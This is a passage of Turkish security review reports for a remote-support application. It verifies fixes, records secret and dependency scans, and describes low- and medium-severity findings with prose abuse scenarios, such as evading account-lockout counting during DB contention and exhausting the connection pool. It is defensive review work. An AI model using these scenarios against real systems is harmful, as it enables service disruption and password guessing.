Karar: Kritik/Yüksek bulgu yok → **GEÇTİ**. S8b-1..4 (Düşük) P8b-1 düzeltme turunda kapatılabilir. Aksi halde `docs/gereksinimler.md` §9'a "Sonra" olarak yazılmalı. S8b-4 commit öncesi yapılmalı (CI).

---

## P8b-1 — Tur 2 — Düzeltme doğrulaması (2026-11-12)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 2 (S8b-5, S8b-6, ikisi de yeni). S8b-1..4 KAPANDI.

Kapsam: `docs/implementation.md` "Backend P8b-1 — düzeltme turu 1": `notify/whatsapp.ts`, `signaling/{admit,ws}.ts`, `requests/{service,routes,panel}.ts`, `lib/{db,errors}.ts`, `test/integration/requests-p8b-4.test.ts`, `auth/service.ts` (503 dönüşümünün giriş akışına etkisi).

### Tur 1 bulgularının durumu

| Bulgu                       | Durum   | Kanıt                                                                                                                                                                                                                                                                                                                                                                                                                              |
| --------------------------- | ------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| S8b-1 SSRF / redirect       | KAPANDI | `notify/whatsapp.ts:243` `redirect: "error"`. `FetchLike` tipi (`:24`) alanı zorunlu tutuyor, dolayısıyla enjekte edilen fetch de bu seçeneği alıyor. `security-p8b-fix1.test.ts`: 307 → başarısız, hedefe ikinci istek gitmiyor.                                                                                                                                                                                                  |
| S8b-2 admitting/peer yarışı | KAPANDI | `admit.ts:111-120`: `room.admitting` ilk `await`'ten önce kuruluyor; yinelenen bağlantı yalnız kendi soketini 1008 `conflict` ile kapatıyor. `admit.ts:168`: `guest.peer` yalnız kazanınca atanıyor. `ws.ts:146-148`: upgrade'de peer atanmıyor. `admit.ts:177`: admit sırasında kapanan soket `detachGuest` ile ayrılıyor. Ret ve zaman aşımı (`endGuest`) yalnız kendi peer'ına gidiyor. `finally` bayrağı her yolda sıfırlıyor. |
| S8b-3 audit'te IP           | KAPANDI | `requests/service.ts:254`: `newValue = { clientVersion }`; IP yalnız `ip_address` sütununda.                                                                                                                                                                                                                                                                                                                                       |
| S8b-4 gitleaks              | KAPANDI | `requests-p8b-4.test.ts:15` `fakeDeviceKey()` çalışma anında `randomBytes` ile üretiliyor. `dir` taramasında bu dosyadan eşleşme yok.                                                                                                                                                                                                                                                                                              |

### Ek değişikliklerin incelemesi (bulgu yok)

- **503 NOT_READY + Retry-After (`lib/errors.ts`):** Gövde sabit (`code/message/requestId`); SQL, stack ve Prisma mesajı yok. Log'a yalnız `alarm` ve `code` yazılıyor. `isTransientDbError` (`db.ts:37-44`) yalnız `PrismaClient*` adlı hataları ve sabit kod kümesini (P2028/P2034, 1205/1213/45028) kabul ediyor; diğer hatalar 500 `INTERNAL` olarak kalıyor. **Oracle:** ref geçersiz, biçim ve consent yolları TX'ten önce 4xx dönüyor; 503 yalnız ref geçerliyken ve TX'te oluşuyor, yani Tur 1'de kabul edilenin ötesinde ayrım sağlamıyor. Girişte başarı TX'i ile başarısızlık TX'i aynı çekişmeden etkileniyor. Bu yüzden 503, "şifre doğru" ile "şifre yanlış" arasında deterministik bir ayrım vermiyor. Talepte TX geri alındığı için yeniden deneme güvenli. Tenant kovası TX'ten önce sayıldığından 503 limit atlatmaya yol açmıyor.
- **AC-147 (`requests/routes.ts:38,55,62`):** accept ve reject `[view, accept]` preHandler dizisini kullanıyor.
- **AC-148 (`requests/panel.ts:147`):** `rejectRequest` içinde `auth.user.tenantId !== tenantId` → 403, kontrol `acceptLimit`'ten ve TX'ten önce yapılıyor.
- **`guest.admitted` (`admit.ts:149`):** `{via, requestId, acceptedBy, guestKind, consentTextId, consentSha256}`. Ad, telefon ve IP içermiyor; IP yalnız sütunda.
- **`request.rate_limited`:** kova ve anahtar türü ayrıştı (`pending.ip` / `pending.prefix` / `pending.tenant`); değer olarak anahtarın kendisi yazılmıyor.

### Bulgular

#### S8b-5 [DÜŞÜK] Seri talep TX'leri ortak bağlantı havuzunu 20 sn'ye kadar tutabiliyor (A04, kaynak tükenmesi)

Yer: `apps/server/src/lib/db.ts:20-27`, `apps/server/src/requests/service.ts:210-256`
Sorun: `SERIAL_TX_OPTIONS` (maxWait 20 sn, timeout 30 sn) ve `acquireTimeout` 20 sn ile her eşzamanlı `POST /public/requests` bir havuz bağlantısı alıyor, ardından `tenant_request_settings … FOR UPDATE` kilidinde bekliyor. Havuz 10 bağlantılık ve panel, giriş ve WS admit ile ortak. Uygulama içinde tenant başına bir eşzamanlılık sınırı yok.
İstismar senaryosu: Geçerli ref'e sahip (firma dosyasını indirmiş) bir saldırgan, IP başına kovaları aşmamak için çok sayıda IP'den aynı anda onlarca talep gönderir. Tenant kovası saatte 60 bilinmeyen kaynakla sınırlı. Ref'ler birden çok firmadan toplanırsa bu sayı katlanır. DB yavaşken havuzun tamamı kilit kuyruğunda bekler ve tüm firmaların panel/giriş istekleri 8–20 sn bekleyip 503 alır. Etki geçici, veri bütünlüğü bozulmuyor. Eski 2 sn varsayılanında da aynı açlık vardı ama daha kısa sürüyordu.
Düzeltme: TX'ten önce süreç içi tenant başına tek uçuşlu kuyruk/semafor (ör. tenant başına en çok 1–2 bekleyen TX, fazlası kısa `maxWait` ile 503) veya talep oluşturma için ayrı küçük bir havuz. `rs_db_busy_total` metriğine alarm eşiği. (atanan ajan: backend-dev; metrik/alarm devops)

#### S8b-6 [DÜŞÜK] Geçici DB hatasında başarısız giriş sayacı artmıyor (A07, hesap kilidi fail-open) — önceden vardı, 503 dönüşümüyle görünür oldu

Yer: `apps/server/src/auth/service.ts:50-61` (`recordFailure`), `:88-92`
Sorun: Hesap düzeyindeki kilit (`bumpAccountFailures`) ve `auth.login fail` audit'i aynı TX'te yapılıyor. TX P2028/1205 ile düşerse sayaç artmıyor, audit yazılmıyor ve istemci 503 alıyor. Bellek içi IP ve (login, IP) kovaları ayakta, ama dağıtık denemeye karşı tek koruma olan hesap kilidi bu anlarda sayılmıyor.
İstismar senaryosu: Saldırgan DB'yi meşgul tutar (ör. S8b-5) ve aynı anda çok IP'den tek bir hesaba şifre dener. Çekişmeye denk gelen yanlış denemeler sayılmaz ve audit'te iz bırakmaz. Doğru şifre çekişme olmayan bir anda 200 döner. Etki düşük: IP başına kova yine geçerli ve çekişme penceresi dar.
Düzeltme: Başarısızlıkta geçici DB hatası alınırsa kayıtlı kullanıcı için de bellek içi bir hesap kovası (`ghostAccount` kalıbı) artırılsın, `auth.login fail` en az log'a yazılsın (`alarm:"auth_fail_unrecorded"`). Ya da sayaç artışı TX dışında, tek bir atomik `UPDATE` olarak yapılsın. (atanan ajan: backend-dev)

### Otomatik tarama çıktıları

- `pnpm audit --audit-level high`: **No known vulnerabilities found**.
- gitleaks v8.30.1 `git` modu: 18 commit tarandı, **no leaks found**.
- gitleaks `dir` modu: 13 eşleşme, hepsi `apps/web/.next/**` (`generic-api-key`, derleme çıktısı, `.gitignore`'da). Gürültü olarak yok sayıldı. Kaynak/test dosyalarında eşleşme yok (Tur 1'deki 2 eşleşme kapandı).

### Tasarımda vaat edilip kodda bulunmayanlar

Yok. `mimari-api.md` hata tablosuna `NOT_READY` (503 + Retry-After) eklendi; kod ile sözleşme uyumlu.

### Olumlu

Yarış düzeltmesi bayrağı ilk await'ten önce kuruyor ve peer sahipliğini kazanana bağlıyor; kaybeden bağlantı oturuma dokunmuyor. Geçici DB hataları 500'den ayrıştırıldı ve bunu yaparken yanıt gövdesine ayrıntı sızdırılmadı. Yeni deterministik güvenlik testleri (`security-p8b-fix1.test.ts`, `db-busy-p8b.test.ts`) eklendi.

Karar: Kritik/Yüksek 0 → **GEÇTİ**. S8b-5 ve S8b-6 (Düşük) `docs/gereksinimler.md` §9'a "Sonra" olarak eklenmeli; S8b-5'in P13 prod öncesinde ele alınması önerilir.

---

# Güvenlik Raporu — P8b-1 — Tur 3

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 2 (yeni) — S8b-5 ve S8b-6 KAPANDI

Kapsam: "Backend P8b-1 — düzeltme turu 2" (`docs/implementation.md`): `lib/gate.ts`, `requests/service.ts`, `auth/service.ts`, `auth/repo.ts`, `lib/rate.ts`, `apps/web/lib/control/machine.ts`.

## Önceki bulguların doğrulaması

- **S8b-5 KAPANDI.** `lib/gate.ts` incelendi.
  - Sınırlar: anahtar başına 2, toplam 4 eşzamanlı; kuyruk anahtar başına 16, toplam 64; bekleme süresi 5 sn (`requests/service.ts:39`).
  - Kuyruk dolunca istek hemen `full` ile reddediliyor (`gate.ts:77`). Bekleyen iş DB bağlantısı tutmuyor.
  - `run` her durumda `finally` ile kapıyı bırakıyor (`gate.ts:55-59`). Zaman aşımı bekleyeni kuyruktan çıkarıyor (`gate.ts:82-85`). Başlatılan bekleyenin zamanlayıcısı temizleniyor (`gate.ts:109`).
  - Sayaç Map'leri sıfıra inince siliniyor (`gate.ts:95-97`, `102-104`). Bellek 64 bekleyen + 4 çalışan ile sınırlı; sızıntı yok.
  - Anahtar sunucuda çözülen `tenantId`. İstemci bunu seçemiyor; kapıya ulaşmadan önce ref ve IP/önek kovaları uygulanıyor.
  - Tenant saatlik kovası (`count`/`add`) kapının içinde sayılıyor (`service.ts:222-233`). Kapıda reddedilen istek kovayı tüketmiyor.
  - Havuzun en az 6 bağlantısı panel, giriş ve WS admit için kalıyor.
  - Kalan risk (kabul): Bütün tenant'lar 64'lük ortak kuyruğu paylaşıyor. Bu kuyruğu dolduracak kadar yavaş TX üretmek için ayar kilidi tutmak gerekir. Bu da IP/önek kovalarıyla (6/sa/IP, 21/sa/önek) sınırlı.
- **S8b-6 KAPANDI.**
  - `auth/repo.ts:42-52`: Sayaç TX dışında tek atomik `UPDATE` ile artıyor. Kilit koşullu `UPDATE … failed_window_at IS NOT NULL AND count >= limit` ile yazılıyor ve `failed_window_at = NULL` yapıyor. Eşzamanlı isteklerde satırı yalnız biri değiştirebiliyor, bu yüzden tek `auth.locked` yazılıyor.
  - İki UPDATE arasında araya giren artış sorun çıkarmıyor. Kilitten sonra pencere NULL olduğu için sayaç 1'den yeniden başlıyor; hesap zaten kilitli.
  - Sayaç yazılamazsa `fallbackFailure` (`auth/service.ts:57-64`) devreye giriyor. Kovanın kendi eşiği veya "DB sayımı + kova sayımı ≥ 20" koşulu kilitliyor. Kova senkron çalışıyor (yarış yok) ve fail-closed. Birinci UPDATE yazılıp ikincisi düşerse en fazla 1 fazla sayıyor; bu da güvenli yönde.
  - `accountWait` yedek kilidi de hesaba katıyor (`:93-97`). Başarılı girişte kova sıfırlanıyor (`:125`).
  - Kova anahtarı yalnız var olan kullanıcının id'si; saldırgan bu anahtarı seçemiyor. `rate.ts` 50.000 kayıt tavanı ve `block()` içindeki S3-1 kuralı (`rate.ts:95-105`) korunuyor. Sınırsız büyüme yok.
  - Alarm loglarında yalnız userId, kod ve bayraklar var. Login, IP ve şifre yazılmıyor (`:75`, `:88`). Audit hatası artık 503 değil, 401/423 dönüyor.
- **Frontend `machine.ts:224-227`:** `requested` fazında gelen `{VIEW, TECH}` artık yok sayılıyor. Bu yalnız konsolun görünüm durumunu etkiliyor. `requested` fazında giriş olayı gönderilmiyor. Sunucu tarafındaki kontrol kapıları (`signaling/control.ts`) bu turda değişmedi; diff'te yok. Kontrol yine yalnız müşterinin `CONTROL` onayıyla açılıyor. **P7 izin modeli zayıflamadı.** En kötü durumda konsol "bekliyor" göstermeye devam eder (UX), yetki genişlemez.

## Bulgular (öncelik sırasıyla)

### [DÜŞÜK] S8b-7 Kilitli hesap dalında audit yazımı korumasız: DB yazma kesintisinde 401/423 ayrımı yerine 5xx — A09/A04

Yer: `apps/server/src/auth/service.ts:115`
Sorun: Kilitli daldaki `writeAudit(db, …)` çağrısı `recordFailure`'daki gibi try/catch ile sarılmamış. DB yazmaları düşerken kilitli bir hesap 5xx alıyor, kilitli olmayan hesap 401 alıyor. S8b-6 notundaki "durum kodundan sinyal çıkmıyor" iddiası bu dalda geçerli değil.
İstismar senaryosu: Kesinti sırasında saldırgan, hedef hesabın kilitli olup olmadığını (dolayısıyla başkasının saldırı altında olduğunu) yanıt kodundan ayırt eder. Etkisi ve penceresi dar; var olan/olmayan hesap ayrımı bu yolla sızmıyor, çünkü ghost hesap da aynı dalı izliyor.
Düzeltme: Kilitli daldaki audit yazımını da `auth_fail_unrecorded` alarmıyla aynı biçimde try/catch'e alın; yanıt her durumda 423 olsun. Bir test ekleyin. (atanan ajan: backend-dev)

### [DÜŞÜK] S8b-8 IP/önek kovaları kapıdan önce tüketiliyor: kapı 503'ünde yeniden deneyen meşru müşteri saatlik kotasını harcıyor — A04

Yer: `apps/server/src/requests/service.ts:194-196` (kova), `:220` (kapı)
Sorun: `createIp` (6/sa/IP) kapıdan önce sayılıyor. Kapı doluyken dönen 503 + `Retry-After: 5`'e uyan istemci her denemede bu kotayı harcıyor. Kapı birkaç kez dolu kalırsa müşteri bir saatlik 429 bloğuna düşüyor. Benzer şekilde tenant kovası kapı içinde `add` edildikten sonra TX P2024 ile düşerse kova kabul edilmeyen talep için de tüketilmiş oluyor.
İstismar senaryosu: Saldırgan kapıyı yavaş TX'lerle doldurur. Aynı NAT arkasındaki meşru müşteriler otomatik yeniden denemelerle kendi IP kotalarını bitirir ve 1 saat talep açamaz. Bu bir kullanılabilirlik etkisi, yetki ihlali değil.
Düzeltme (P8b-2 istemci yeniden denemesiyle birlikte):

- Kapı reddinde (`GateBusyError`) IP kovasından 1 düşün veya kapı 503'ünü IP kovasında saymayın.
- Ya da istemcide yeniden deneme sayısını 503 başına en çok 2 ile sınırlayın.
- Tenant kovası `add`'ini TX commit sonrasına taşıyın veya hata dalında geri alın.
  (atanan ajan: backend-dev; istemci kısmı frontend-dev/agent)

Bilgi (bulgu değil): `gate.ts:72` hızlı yolu kuyruğu kontrol etmiyor; yeni gelen iş bekleyenin önüne geçebiliyor. Bekleyen en geç 5 sn'de zaman aşımına uğrar ve sınırlar korunur, güvenlik etkisi yok. Adillik isteniyorsa `canRun` kuyrukta aynı anahtarın bekleyeni olmamasını da şart koşabilir.

## Otomatik tarama çıktıları

- `gitleaks git` (docker `zricethezav/gitleaks:latest`, `--redact`): **18 commit tarandı, no leaks found**. Yerel `gitleaks` ikili dosyası kurulu değil. Not: git modu commit edilmemiş/izlenmeyen dosyaları (ör. `lib/gate.ts`, `security-p8b-fix2.test.ts`) taramaz.
- Bu dosyalar için şablondaki gizli bilgi regex'i (`api_key|secret|password|token` = 8+ karakter literal) çalıştırıldı: **0 eşleşme**.

## Tasarımda vaat edilip kodda bulunmayanlar

Yok. Kapı ve fail-closed hesap kilidi, implementation notlarında anlatıldığı gibi kodda mevcut.

## Olumlu

- Kapı küçük, bağımlılıksız ve sınırlı belleklidir. Ayrım kanıtı var: kapı 100/100'e açılınca test kırmızıya dönüyor.
- Hesap kilidi DB kesintisinde fail-closed çalışıyor; audit, sayaç yazımından ayrıldı.
- Alarm logları PII içermiyor. 503 yanıtında Retry-After var, SQL/stack yok.

Karar: Kritik/Yüksek 0 → **GEÇTİ**. S8b-7 ve S8b-8 (Düşük) `docs/gereksinimler.md` §9'a "Sonra" olarak eklenmeli. S8b-8 en geç P8b-2'deki istemci yeniden deneme işiyle birlikte ele alınmalı.

---

## P13b-L — kod turu 1

Tarih: 2026-11-15 · Kapsam: çalışma ağacındaki P13b-L değişiklikleri (commit edilmemiş). Kaynak: `docs/gereksinimler-lobi-gostergesi.md` (AC-304..316), `docs/mimari-lobi.md` §3–§5, ADR-0029.
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 1 / Bilgi 5

### Tasarım vaadi → kod doğrulaması

| Vaat (mimari-lobi §4.1/§5)                                                                | Kod                                                                                                                                                                                                                                                     | Sonuç                                                                                                                                      |
| ----------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| Guard sırası requireAuth → requirePerm(sessions.view) → tenantScope → hız sınırı → servis | `apps/server/src/sessions/routes.ts:51` (plugin `preHandler` requireAuth), `:77` requirePerm, `:79` tenantScope, `:80-81` sayaç                                                                                                                         | Var                                                                                                                                        |
| Tenant/teknisyen istemciden alınmaz                                                       | `sessions/lobby.ts` `getWaitingSessions(rooms, auth, tenantId)`; `signaling/rooms.ts:105-113` `room.tenantId === tenantId && room.technicianId === technicianId`                                                                                        | Var; sorgu dizesi hiç okunmuyor                                                                                                            |
| Firma seçmemiş Super Admin → 403                                                          | `tenantScope(req)` (`routes.ts:79`); test "AC-310"                                                                                                                                                                                                      | Var                                                                                                                                        |
| 60/dk/kullanıcı, 61. istek 429 + Retry-After                                              | `routes.ts:75` `FixedWindowCounter(61, 60 sn, 60 sn)`, anahtar `user.id`; `lib/errors.ts:80` Retry-After                                                                                                                                                | Var. Anahtar kimliği doğrulanmış kullanıcı kimliği: sahte anahtarla tablo şişirilemez; tablo zaten 50 000 kayıt üst sınırlı ve süpürülüyor |
| `Cache-Control: no-store`, audit yok                                                      | `routes.ts:82`; test `audit_logs` öncesi = sonrası                                                                                                                                                                                                      | Var                                                                                                                                        |
| Yanıt yalnız sayı + kendi oturum ULID'i (AC-311)                                          | `waitingSessionsResponseSchema` `strictObject` (`packages/contracts/src/api/sessions.ts`); test gövdede ad/e-posta/IP/kod yok                                                                                                                           | Var                                                                                                                                        |
| Liste `waitingGuests` kapsamı = `historyScope`                                            | `sessions/history.ts:101-104` (yalnız DB'nin zaten döndürdüğü satırlar için `waitingIn(id)`); `customers/service.ts:220` aynı `historyScope`                                                                                                            | Var; başka tenant/teknisyen satırı yanıta yeni girmiyor                                                                                    |
| Bellekten okuma, yarışsız                                                                 | `rooms.ts:99-121` eşzamanlı (await yok) tek geçiş; `lobbyWaiting` ending/admitted/expiresAt süzgeci                                                                                                                                                     | Var; Node tek iş parçacığında okuma tutarlı, kilit gerekmez                                                                                |
| e2e kancaları üretime girmez                                                              | `/__e2e/lobby*` yalnız `apps/web/e2e/mock-api.mjs:97-100` + `e2e/mock-sessions.mjs`; `app/`, `components/`, `lib/`, `apps/server/src` içinde iz yok; web imajı yalnız `.next/standalone` + `static` + `public` kopyalıyor (`apps/web/Dockerfile:32-34`) | Var                                                                                                                                        |
| tenant-matrix sınıflandırması                                                             | `test/helpers/tenant-matrix.ts:54` `"scoped"`; izolasyon `sessions-lobby-p13bl.test.ts` AC-309/310                                                                                                                                                      | Var                                                                                                                                        |

### Bulgular

#### [DÜŞÜK] S13L-1 `waitingGuests` yalnız `session_history.view` ile de okunabiliyor (AC-314 "sessions.view yoksa 403" ile ifade farkı) — A01 Erişim Denetimi

Yer: `apps/server/src/sessions/routes.ts:67-70` (`requireAnyPerm("sessions.view","session_history.view")` + `app.rooms`), `apps/server/src/customers/routes.ts:109` (`customers.view` + `session_history.view`) → `customers/service.ts:220`.
Sorun: Yeni uç `sessions.view` istiyor, ama aynı canlı bilgi (PENDING satırda bekleyen misafir sayısı) mevcut liste uçlarına alan olarak eklendi. Bu uçlar `sessions.view` istemiyor. `sessions.view` kapalı, `session_history.view` açık bir ADMIN (historyScope tenant geneli) tenant'taki bütün PENDING oturumların lobi sayısını 10 sn aralıkla izleyebilir. USER'da kapsam kendi satırlarıyla sınırlı kalıyor.
İstismar senaryosu: Tenant içi, düşük etkili bilgi. Yetkisi yalnız geçmiş görüntülemeye daraltılmış bir yönetici, teknisyenlerin o anda müşteri beklettiğini görebilir. Başka tenant'a ya da kişisel veriye (ad/IP/kod) sızıntı yok. Mimari §9.1 bunu bilerek kabul ediyor ("yalnız session_history.view olan kullanıcıda liste 200, uç 403").
Düzeltme (seçenekler): (a) `toListItem` içinde `auth.permissions.has("sessions.view")` değilse `waitingGuests = 0` döndürmek. (b) Davranışı kabul edip AC-314 metnine "mevcut liste uçlarındaki `waitingGuests` alanı, listenin kendi yetkisine tabidir" diye not düşmek. Atanan ajan: backend-dev (a) ya da proje-yoneticisi (b). Gereksinimler §9'a "Sonra" olarak eklenmesi önerilir.

#### [BİLGİ] S13L-2 Hız sınırı yetki/tenant reddinden sonra sayılıyor

Yer: `routes.ts:77-81`. 403 yanıtları (yetki yok, firma seçilmemiş) sayaca girmiyor. Bu yollar bellek içi ve ucuz, kullanıcı kimliği doğrulanmış olmak zorunda. Mimari §4.1 sırasıyla uyumlu. İşlem gerekmiyor.

#### [BİLGİ] S13L-3 Hata yanıtlarında (403/429) `no-store` yok

Yer: `routes.ts:82` başlık yalnız başarı yolunda. 403 ve 429 sezgisel olarak önbelleğe alınabilen durum kodları değil, gövdede kişisel veri de yok. Risk yok. İsteğe bağlı olarak global hata işleyicisine `no-store` eklenebilir (backend-dev, Sonra).

#### [BİLGİ] S13L-4 `arrivals` sayacı kendi lobisindeki geçmiş giriş sayısını açığa çıkarıyor

Yer: `rooms.ts:183`. Monoton sayaç yalnız odanın kendi teknisyenine dönüyor ve kişi bilgisi taşımıyor (AC-311 ile uyumlu). Odanın ömrüyle sınırlı. İşlem gerekmiyor.

#### [BİLGİ] S13L-5 Web tarafında enjeksiyon ve veri sızıntısı yüzeyi yok

`lobby-notifier.tsx`, `waiting-badge.tsx`, `lib/tab-title.ts` ve `tab-title.tsx` yalnız sayıları React metin düğümüne ya da `document.title`'a yazıyor (`dangerouslySetInnerHTML` yok). Toast/rozet bağlantısındaki `id` şemada ULID regex'iyle doğrulanıyor (`/sessions/${id}/console`). Bu yüzden yol enjeksiyonu yapılamıyor. Konsol bağlantısı yalnız `technician.id === meId && !pickTenant` iken veriliyor (`session-list.tsx`). Bu yalnız UI kolaylığı: konsol ve kabul yetkisi sunucuda (G-04) değişmedi. Firma seçmemiş Super Admin'de notifier bağlanmıyor (`layout.tsx:41`). 403 gelirse yoklama duruyor (`lobby-notifier.tsx:104`).

#### [BİLGİ] S13L-6 e2e kancaları kimlik doğrulamasız ama yalnız sahte sunucuda

`/__e2e/lobby`, `/__e2e/lobby-calls`, `/__e2e/lobby-extra` yalnız `node e2e/mock-api.mjs` (playwright `webServer`, port 4217) içinde var. Üretim Next sunucusunda ve Fastify'da karşılığı yok. `e2e/` klasörü build bağlamına giriyor, ama standalone çıktı onu import etmediği için çalışma imajına girmiyor. İşlem gerekmiyor.

### Otomatik doğrulama (bu tur)

- `apps/server` entegrasyon + birim: `sessions-lobby-p13bl.test.ts`, `sessions-history-api-p8.test.ts`, `tenant-isolation.test.ts`, `lobby-count-p13bl.test.ts` → **4 dosya, 54 test geçti**. Ayrı geçici konteynerde koşuldu (`rs-mysql-test-guv-p13bl`, port 33391; bitince silindi).
- AC-314 perf (test çıktısı): 100 oda/300 misafir, 1000 istek → p50 3.05 ms, **p95 15.98 ms** (hedef ≤ 100 ms).
- Yeni bağımlılık yok. Migration, grant ve env değişikliği yok. Bu nedenle `pnpm audit` ve gizli bilgi taraması bu turda tekrarlanmadı.

### Tasarımda vaat edilip kodda bulunmayanlar

Yok.

### Olumlu

- Sahiplik süzmesi tek yerde (`Rooms.waitingFor`) ve tamamen `auth`'tan türetiliyor. Uçta IDOR yüzeyi yok, çünkü uç id parametresi almıyor.
- Yanıt şeması `strictObject`: ileride yanlışlıkla eklenecek ad/e-posta alanı hem sunucu testinde hem web `safeParse`'ında yakalanır.
- `SessionHistoryDetail` canlı alanı taşımıyor (`Omit`). Detay ve PATCH yollarına `rooms` bağımlılığı eklenmedi.
- Hız sınırı mevcut sınırlı ve süpürülen `FixedWindowCounter` sınıfını kullanıyor. Kapanışta `onClose` ile temizleniyor.
- Tek başlık yazıcısı (`TabTitle`), iki bildiricinin birbirinin önekini silmesini önlüyor.

DURUM: GEÇTİ (Kritik 0 / Yüksek 0). S13L-1 (Düşük) `docs/gereksinimler.md` §9'a "Sonra" olarak eklenmeli ya da AC-314 metni netleştirilmeli.

---

## P13c (kod kısmı) — kod turu 1

Tarih: 2026-11-15 · Kapsam: commit edilmemiş C1/C2/C4 değişiklikleri (`deploy/`, `.github/workflows/agent-win.yml`, `ci.yml`, `.env.example`, `deploy/agent/verify-and-publish.sh`, `deploy/ops/*`, `deploy/backup/*`, yeni şablon birimler, `docker-compose.staging.yml`). Kaynak: `docs/mimari-e11.md` §3, ADR-0019 m.5, ADR-0021, `docs/implementation.md` "P13c — devops (kod kısmı)", `docs/runbook.md` §21. Staging'e bağlanılmadı.
Özet: Kritik 0 / Yüksek 0 / Orta 2 / Düşük 4 / Bilgi 4

### Tasarım vaadi → kod doğrulaması

| Vaat                                                      | Kod                                                                                                                                                                               | Sonuç                                                            |
| --------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------- |
| Prod `docker compose config` farkı 0                      | HEAD ile çalışma ağacı compose'u aynı `.env` ile `config` alındı                                                                                                                  | **Aynı** (yerelde diff 0)                                        |
| Caddy `trusted_proxies` env, varsayılan prod              | `Caddyfile:58`. HEAD/yeni Caddyfile `caddy adapt` JSON'u (`jq -S`) karşılaştırıldı                                                                                                | **Aynı** (48 158 bayt, diff 0)                                   |
| Staging katmanında `CADDY_TRUSTED_PROXIES` zorunlu        | `docker-compose.staging.yml:11` `:?`                                                                                                                                              | Var. Boş/eksikse compose duruyor (denendi)                       |
| `ROBOTS_NOINDEX` yalnız staging                           | `staging.yml:13` sabit `"1"`, `.env`'den okunmaz. `Caddyfile:88` `robots_{0,1}`                                                                                                   | Var. `ROBOTS_NOINDEX=2` → Caddy açılmıyor (fail-closed, denendi) |
| stg exe yalnız main + yalnız stg adresi, Release'e gitmez | `agent-win.yml:140-172` (girdiler `env:` üzerinden, `run` içinde `${{ inputs.* }}` yok), `:213-226` exe adı regex, `release` `:253-265` yalnız `agent-win` artifact'ini indiriyor | Var                                                              |
| Attestation                                               | `attest` job'u `workflow_dispatch`'te de çalışıyor, `subject-path` regex'ten geçmiş ad                                                                                            | Var                                                              |
| Volume adı çözülemezse dur                                | `verify-and-publish.sh:65` sabit ad yedeği kaldırılmış                                                                                                                            | Var                                                              |
| Ortam kilidi (stg ↔ prod exe)                             | `verify-and-publish.sh:49-56`                                                                                                                                                     | Var ama yalnız `DEPLOY_ENV`'e dayanıyor (S13C-1, S13C-3)         |
| proxy-guard çok port, tek port geriye uyumlu              | `proxy-guard.sh:58-61`, `:81-85` (tek portta `DPORT=$PORT`, imza `rpg:4451:…` değişmiyor)                                                                                         | Var                                                              |
| `remote-watch@` örneği prod adlarına düşmez               | `remote-watch.sh:41-46` (örnek adı `^[a-z][a-z0-9]{0,15}$`), `:351-353` `WATCH_PUBLIC_HOST` zorunlu, `:416-418` başarısız birim ayrımı                                            | Var                                                              |
| Staging yedeği prod'a geri yüklenemez (ve tersi)          | `restore.sh` manifest env + `RESTORE_EXPECT_PROJECT` (mevcut). Test `test-backup-inner.sh` bölüm H                                                                                | Var. Yedek _alma_ tarafında karışma riski var (S13C-2)           |

### Bulgular

#### [ORTA] S13C-1 Staging `.env`'de `COMPOSE_PROJECT_NAME` eksikse staging dizini prod projesini yönetiyor; yayın kilidi bunu yakalamıyor — A05 Güvenlik Yanlış Yapılandırması / A04 Güvensiz Tasarım

Yer: `deploy/agent/verify-and-publish.sh:49-56` (kilit yalnız `DEPLOY_ENV`), `:63-65` (volume adı), `:89` (`docker compose up -d --no-deps server`). `deploy/docker-compose.yml:138` `name: remote`. `deploy/docker-compose.staging.yml` (proje adı yok).
Sorun: Proje adı yalnız staging `.env`'deki `COMPOSE_PROJECT_NAME` satırından geliyor. Satır unutulursa (ya da yanlış yazılırsa) `/opt/remote-stg/deploy` içinde compose projesi `remote` olur. Yerelde doğrulandı: `COMPOSE_FILE` + `DEPLOY_ENV=staging` var, `COMPOSE_PROJECT_NAME` yok → `docker compose config` çıktısı `name: remote` ve volume `remote_agent_downloads`. Ortam kilidi `DEPLOY_ENV=staging` gördüğü için `stg-` etiketini kabul ediyor.
İstismar senaryosu (operatör hatası): `verify-and-publish.sh --stg-run <id>` → staging adresli exe **prod** `remote_agent_downloads` volume'una yazılır → prod müşterileri `stg.remote…`'a bağlanan istemciyi indirir (destek oturumları ve müşteri bilgileri staging'e gider). Ardından `docker compose up -d --no-deps server` prod `remote-server-1` konteynerini staging `.env` sırlarıyla yeniden yaratır, bu da prod kesintisi demek. Aynı durum staging'de yapılan her `docker compose up/down` için de geçerli. Runbook §21.3/3'teki `config | grep '^name:'` kontrolü elle yapılıyor, zorlanmıyor.
Düzeltme: (1) `apply()` içinde `docker compose config --format json | jq -r .name` ile çözülen proje adını `DEPLOY_ENV` ile eşleştirin: `production` ⇒ `remote`, `staging` ⇒ `remote` dışında bir ad (ör. `remote-stg`). Uymuyorsa durun. (2) `docker-compose.staging.yml`'e `name: remote-stg` ekleyin. Sonraki dosyadaki `name` geçerli oluyor (yerelde denendi: `COMPOSE_PROJECT_NAME` olmadan da `name: remote-stg`). Prod çıktısı değişmez, çünkü katman prod'da yüklenmiyor. (3) `test-backup`/`ci.yml` benzeri bir sınama: staging katmanı yüklü, proje adı yok → ad `remote-stg`. Atanan ajan: devops.

#### [ORTA] S13C-2 `remote-backup@` şablonu eksik `backup.env` anahtarlarında prod yollarına düşüyor: prod yedekleri silinebilir, prod izleme maskelenebilir — A05 / A08 Veri Bütünlüğü

Yer: `deploy/backup/remote-backup@.service:14` (yalnız `ExecStart`, `Environment=` yok), `deploy/backup/backup.sh:90` (`BACKUP_SIGNING_KEY` varsayılanı `/etc/remote-backup/manifest_ed25519`), `deploy/backup/lib-offsite.sh:6` (`BACKUP_STATUS_FILE` varsayılanı `/var/lib/remote-backup/status.prom`), `deploy/backup/lib.sh:234-243` (`rotate_runs` dizindeki bütün çalıştırmaları ada/yaşa göre siler, manifest `env`'ine bakmaz).
